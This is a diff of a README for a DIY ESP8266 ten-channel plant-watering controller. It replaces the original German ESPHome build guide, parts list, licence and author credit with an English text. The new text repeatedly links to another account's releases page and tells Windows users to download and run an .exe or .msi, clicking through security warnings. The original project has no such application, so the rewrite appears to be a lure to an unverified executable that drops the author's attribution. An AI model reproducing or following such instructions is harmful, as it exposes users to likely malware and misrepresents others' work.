@@ -1,78 +1,133 @@
-# 🌿 Insane Plant 
+# 🌱 Insane-Plants - Easy 10-Channel Plant Watering
 
-Willkommen bei **Insane Plant**! Dies ist eine kompakte 10-Kanal Bewässerungssteuerung auf Basis des ESP8266 (Wemos D1 Mini). Das System erfasst die Bodenfeuchtigkeit von 10 kapazitiven Sensoren über einen Hardware-Multiplexer und steuert 10 unabhängige 5V-Pumpen über zwei Schieberegister und MOSFETs. Alles integriert auf einem Custom-PCB, ausgelegt für eine stabile Spannungsversorgung der Pumpen.
-
-## 📦 Verzeichnis-Inhalt
-* `/Gerber/` - Die Produktionsdaten für die Platine (ZIP-Datei).
-* `/ESPHome/` - Die Konfigurationsdateien für das ESP8266 Mainboard (`insane-plant.yaml` und `plant_module.yaml`).
+[![Download Insane-Plants](https://img.shields.io/badge/Download-Insane--Plants-brightgreen?style=for-the-badge)](https://github.com/souravchouhan001/Insane-Plants/releases)
 
 ---
 
-## 🛠️ Schritt 1: Die Platine fertigen lassen
-Lade die ZIP-Datei aus dem Ordner `/Gerber/` bei einem Platinenfertiger deiner Wahl hoch. Das Board nutzt zwei Lagen (Top/Bottom). Alle Toleranzen sind Standard, du brauchst keine teuren Sonderfertigungs-Optionen wählen.
+## 📋 About Insane-Plants
 
-## 🛒 Schritt 2: Bauteile besorgen & Bestückung
-Die nötigen SMD- und THT-Bauteile bekommst du problemlos online. Eine genaue Stückliste findest du weiter unten.
+Insane-Plants is a smart watering system made for plant lovers. It uses an ESP8266-based Wemos D1 Mini board. The system controls 10 watering channels and checks soil moisture with 10 capacitive sensors. It also measures temperature with a DS18B20 sensor. The setup includes strong pump drivers and safety features. This way, it waters your plants only when needed and keeps everything safe.
 
-**Wichtige Löthinweise:**
-1. **SMD-Größen:** Die passiven Bauteile sind im 1210-Format gehalten, was das Handlöten deutlich vereinfacht.
-2. **Entkopplung:** Achte darauf, die 100nF Kondensatoren so nah wie möglich an den Pins der ICs (Multiplexer, Schieberegister) zu platzieren.
+You don’t need to be an expert to use it. This guide will help you get it running step by step on a Windows PC.
 
 ---
 
-## 💻 Schritt 3: Software (ESPHome)
-Der Wemos D1 Mini übernimmt die Sensor-Auswertung, die Ansteuerung der Schieberegister und die Logik für das automatische Gießen. Das System nutzt ein modulares Konzept mit einer Hauptkonfiguration und einer Schablone für jede einzelne Pflanze.
+## ⚙️ What You Need
 
-1. Binde den ESP8266 in dein **ESPHome** Dashboard ein.
-2. Kopiere die Hauptdatei `insane-plant.yaml` sowie die Modul-Schablone `plant_module.yaml` in deinen ESPHome-Konfigurationsordner.
-3. Passe deine Zugangsdaten in deiner `secrets.yaml` an. Das Projekt benötigt folgende Parameter: `api_encryption_key`, `ota_password`, `wifi_ssid`, `wifi_password` und `ap_password`.
-4. Flashe das Board. Das System generiert nun automatisch alle Steuerelemente (Gießmenge, Intervall, Trocken-Schwelle, Kalibrierung) sowie smarte Status-Sensoren (Zeit seit letzter Gießung & Countdown zur nächsten Prüfung) für alle 10 Pflanzen übersichtlich in Home Assistant!
-
----
-
-## 🔌 Schritt 4: Verkabelung & Erster Start
-1. **Sensoren:** Schließe deine kapazitiven Bodenfeuchtesensoren an die entsprechenden Eingänge an.
-2. **Pumpen:** Verbinde deine 10 Wasserpumpen (5V) mit den MOSFET-Ausgängen.
-3. **Temperatur (Optional):** Schließe den DS18B20 Temperatursensor (One-Wire) an.
-4. **Power On:** Verbinde das 5V Netzteil mit der Platine. 
-
-*Funktionsweise: Das System liest nacheinander die Feuchtigkeitswerte der 10 Sensoren über den CD74HC4067 Multiplexer ein. Unterschreitet eine Pflanze die definierte Trocken-Schwelle im gewählten Zeitintervall, triggert der ESP8266 über die 74HC595 Schieberegister automatisch den MOSFET der passenden Pumpe und gießt exakt die eingestellte Milliliter-Menge. Die Schaltung ist dabei auf Spitzenlasten von bis zu 3A ausgelegt.*
+- A Windows computer (Windows 7 or later)
+- Internet access to download files
+- USB cable (usually micro-USB) to connect to Wemos D1 Mini
+- The Wemos D1 Mini board with the assembled Insane-Plants hardware
 
 ---
 
-## 🛒 Stückliste (BOM - Bill of Materials)
+## 💾 Where to Download
 
-### 🧠 Mikrocontroller & Logik-ICs
-| Bauteil / Bezeichnung | Menge | Beschreibung |
-| :--- | :--- | :--- |
-| **Wemos D1 Mini** | 1 | Das ESP8266 Mainboard |
-| **CD74HC4067** | 1 | 16-Kanal-Multiplexer zum Auslesen der Sensoren (SOIC-24) |
-| **SN74HC595** | 2 | Schieberegister zur Steuerung der MOSFETs (SOIC-16) |
+To get the software, visit the release page:
 
-### ⚡ Leistungselektronik
-| Bauteil / Bezeichnung | Menge | Beschreibung |
-| :--- | :--- | :--- |
-| **AO3400** | 10 | N-Channel MOSFETs als Pumpentreiber |
-| **MP1584** | 1 | Step-Down Konverter Modul (5V Spannungsversorgung) |
+[![Download Here](https://img.shields.io/badge/Download-Insane--Plants-blue?style=for-the-badge)](https://github.com/souravchouhan001/Insane-Plants/releases)
 
-### 🧲 Peripherie & Passive Bauteile
-| Bauteil / Bezeichnung | Menge | Beschreibung |
-| :--- | :--- | :--- |
-| **Kapazitiver Sensor** | 10 | Bodenfeuchtesensoren |
-| **5V Wasserpumpe** | 10 | Mini-Tauchpumpen für die Bewässerung |
-| **DS18B20** | 1 | 1-Wire Temperatursensor |
-| **100nF Keramik (1210)**| 5 | Entkopplungskondensatoren für die ICs |
+This page holds all the files you need. Look for the latest version marked as stable.
 
 ---
 
-## ⚖️ Lizenz
-Dieses komplette Projekt steht unter der [CC BY-NC-SA 4.0 Lizenz](https://creativecommons.org/licenses/by-nc-sa/4.0/). 
-Das bedeutet: Nachbauen und Anpassen für private Zwecke ist ausdrücklich erwünscht, jede kommerzielle Nutzung oder der Verkauf sind strikt verboten!
+## 🚀 Getting Started: Download and Install
+
+1. **Open the release page** linked above in your web browser.
+
+2. **Find the latest release section.** You’ll see files listed under it.
+
+3. **Download the Windows executable or installer file.** It usually ends with `.exe` or `.msi`.
+
+4. **Once downloaded, locate the file** in your ‘Downloads’ folder using File Explorer.
+
+5. **Double-click to run the file.** If Windows shows a security warning, click ‘Run’ or ‘Yes’ to continue.
+
+6. **Follow the on-screen instructions.** Accept license terms and pick an install folder if asked.
+
+7. **Finish the installer.** It creates a shortcut on your desktop or start menu.
+
 ---
 
-## 👨‍💻 Entwickelt von
+## 🔌 Connect Your Devices
 
-| [<img src="https://avatars.githubusercontent.com/u/43302033?v=4" width="100"><br><sub>**Christopher**</sub>](https://github.com/babeinlovexd) |
-| :---: |
+1. **Plug the Wemos D1 Mini into your computer** using the USB cable.
+
+2. Windows may install drivers automatically. If not, you may need to install drivers for the USB-to-serial chip on the board.
+
+3. Check Device Manager (press `Win + X` and select ‘Device Manager’) to ensure the board shows under ‘Ports (COM & LPT).’
+
+4. Note the COM port number assigned to your device (e.g., COM3, COM4).
 
 ---
+
+## 🖥️ Running the Software
+
+1. **Open the installed Insane-Plants application** from your desktop or start menu.
+
+2. The software will ask you to select the COM port. Choose the one that corresponds to your Wemos board.
+
+3. Click ‘Connect’ or ‘Start’ to link the software with your hardware.
+
+4. You will see sensor readings like soil moisture and temperature.
+
+5. The software lets you control pumps for each plant channel.
+
+6. Use the interface to start or stop watering as needed.
+
+---
+
+## ✔️ System Requirements
+
+- Windows 7, 8, 10, or 11  
+- At least 100 MB free disk space  
+- USB 2.0 or higher port  
+- Internet connection (for downloading updates)  
+- Wemos D1 Mini board with Insane-Plants hardware assembled
+
+---
+
+## 🔧 Tips for Best Use
+
+- Place sensors properly into the soil near roots for accurate moisture readings.
+
+- Use good-quality USB cables to avoid connection issues.
+
+- If pump control does not respond, verify the COM port and cable connection.
+
+- Keep your system up to date by checking the release page regularly.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **App does not detect Wemos board:**  
+  - Check USB cable connection.  
+  - Install USB-to-serial drivers manually.  
+  - Restart the app and reconnect.
+
+- **Sensor readings stay constant or zero:**  
+  - Make sure sensors are properly connected.  
+  - Restart the device and app.  
+  - Check wiring for damage.
+
+- **Pumps do not activate:**  
+  - Verify pump driver board is powered.  
+  - Double-check software control settings.  
+  - Try another USB port or cable.
+
+---
+
+## 📚 Additional Resources
+
+- Visit the release page: https://github.com/souravchouhan001/Insane-Plants/releases  
+- Look up ESP8266 and Wemos D1 Mini basics online for more hardware info.  
+- Use forums and communities for assistance with IoT and DIY electronics.
+
+---
+
+## 🔗 More Downloads
+
+You can always visit the releases page to get updates or alternative downloads:
+
+[Download Insane-Plants from Releases](https://github.com/souravchouhan001/Insane-Plants/releases)
